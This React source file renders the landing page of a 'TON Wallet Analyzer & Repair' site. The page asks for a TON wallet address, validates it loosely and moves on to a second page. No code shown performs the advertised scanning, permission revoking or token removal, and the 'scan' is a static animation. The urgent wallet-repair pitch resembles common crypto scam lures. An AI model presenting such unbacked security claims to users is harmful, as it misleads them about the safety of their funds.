import { useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import "./Page1_Hello.css";


function Page1_Hello() {
  const buttonRef = useRef(null);
  const [wallet, setWallet] = useState("");
  const [error, setError] = useState("");
  const navigate = useNavigate();


    function validateTonAddress(addr) {
      return addr.length === 48 && addr.startsWith("UQ");
    }

  function handleInputChange(e) {
    const value = e.target.value.trim();
    setWallet(value);
    if (!value) {
      setError("");
    } else if (!validateTonAddress(value)) {
  setError("Enter a valid TON address: 48 chars, starts with UQ");
    } else {
      setError("");
    }
  }

  function handleSubmit(e) {
    e.preventDefault();
    if (validateTonAddress(wallet)) {
      navigate("/page2");
    } else {
  setError("Enter a valid TON address: 48 chars, starts with UQ");
    }
  }

  return (
    <>
      <div className="page1-hello">
        <div className="header">
          <div className="logo-container">
            <svg width="50" height="50" fill="white" viewBox="0 0 24 24">
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
              <path d="M9 12l2 2 4-4" stroke="white" strokeWidth="2" fill="none"/>
            </svg>
          </div>
          <h1 className="main-title">TON Wallet Analyzer &amp; Repair</h1>
          <p className="subtitle">
            A professional solution for automatic wallet scanning, threat detection, and remediation
          </p>
        </div>

        <div className="features-rects closer-to-header">
          <div className="feature-card rect">
            <div className="feature-content">
              <div className="feature-icon">
                <svg width="30" height="30" fill="white" viewBox="0 0 24 24">
                  <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
              </div>
              <div className="feature-text">
                <h3 className="feature-title">Revoke Unnecessary Permissions</h3>
                <p className="feature-description">
                  Automatically detect and revoke excessive permissions granted to third-party apps and services
                </p>
              </div>
            </div>
          </div>
          <div className="feature-card rect">
            <div className="feature-content">
              <div className="feature-icon">
                <svg width="30" height="30" fill="white" viewBox="0 0 24 24">
                  <path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                </svg>
              </div>
              <div className="feature-text">
                <h3 className="feature-title">Block Suspicious Smart Contracts</h3>
                <p className="feature-description">
                  Intelligent analysis and real-time blocking of potentially dangerous smart contracts
                </p>
              </div>
            </div>
          </div>
          <div className="feature-card rect">
            <div className="feature-content">
              <div className="feature-icon">
                <svg width="30" height="30" fill="white" viewBox="0 0 24 24">
                  <path d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/>
                </svg>
              </div>
              <div className="feature-text">
                <h3 className="feature-title">Remove Malicious Tokens</h3>
                <p className="feature-description">
                  Comprehensive cleaning of your wallet from suspicious and potentially harmful tokens and assets
                </p>
              </div>
            </div>
          </div>
        </div>


        <div className="cta-section closer-cta">
          <p className="cta-text">
            Don’t wait for problems — run a professional wallet diagnostic right now
          </p>
          <form className="cta-input-form" onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8, marginBottom: 18 }}>
            <input
              type="text"
              className="cta-input"
              placeholder="Enter your TON wallet address"
              value={wallet}
              onChange={handleInputChange}
              style={{
                padding: '10px 16px',
                borderRadius: 8,
                border: error ? '1.5px solid #f87171' : '1px solid #cbd5e1',
                fontSize: 16,
                width: '48ch',
                minWidth: '0',
                maxWidth: '100%',
                outline: error ? '#f87171' : undefined,
                textAlign: 'center'
              }}
              autoComplete="off"
            />
            {error && (
              <span style={{ color: '#f87171', fontSize: 13, marginTop: 2 }}>{error}</span>
            )}
            <button
              className="cta-button"
              ref={buttonRef}
              type="submit"
              style={{ marginTop: 12, marginBottom: 38, opacity: error || !wallet ? 0.6 : 1, pointerEvents: error || !wallet ? 'none' : 'auto' }}
              disabled={!!error || !wallet}
            >
              Start diagnostics
            </button>
          </form>
        </div>

        <div className="scanning-animation" id="scanningAnimation">
          <div className="scan-line"></div>
          <div className="progress-bar">
            <div className="progress-fill" id="progressFill"></div>
          </div>
          <p id="scanStatus" style={{ color: "#94a3b8", marginTop: 15 }}>Initializing scan...</p>
        </div>
      </div>
    </>
  );
}

export default Page1_Hello;